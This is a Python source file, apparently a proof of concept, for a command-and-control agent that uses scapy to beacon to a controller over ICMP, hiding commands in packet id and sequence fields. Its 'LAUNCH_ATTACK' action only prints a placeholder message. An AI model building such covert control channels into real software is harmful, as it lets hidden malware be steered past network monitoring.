import lib.icmp_common as icmp_common
from scapy.all import sniff, send, ICMP, IP
from time import sleep
from random import randint


class c2Agent(icmp_common.absurdIcmp):
    def __init__(self, controller_ip):
        self.controller_ip = controller_ip
        self.identifier = randint(0, self.max_id)
        self.action = "DO_NOTHING"
        self.response_received = False

    def _process_incoming_packets(self, pkt):
        sequence = pkt[IP][ICMP].seq
        identifier = pkt[IP][ICMP].id
        print("Processing response from controller")
        self.response_received = True
        if self.identifier == identifier:
            for key, value in self.c2_actions.items():
                if value == sequence:
                    self.action = key
                    break

    def send_listen_act(self):
        seq = randint(100, self.max_id)
        self.updated = False

        send(
            IP(dst=self.controller_ip) / ICMP(id=self.identifier, seq=seq),
            verbose=False,
        )
        sniff(
            filter=f"icmp and host {self.controller_ip}",
            prn=self._process_incoming_packets,
            timeout=5,
        )

        if self.action == "KILL_PROCESS":
            print("controller requested to kill agent")
            exit()
        elif self.action == "LAUNCH_ATTACK":
            print("gonna do the bad thing")
        else:
            print("awaiting instructions from controller")


def start(controller_ip, interval=10):
    agent = c2Agent(controller_ip)

    # no fancy handling here, we just keep doing our thing until SIGINT
    while True:
        agent.send_listen_act()
        sleep(interval)
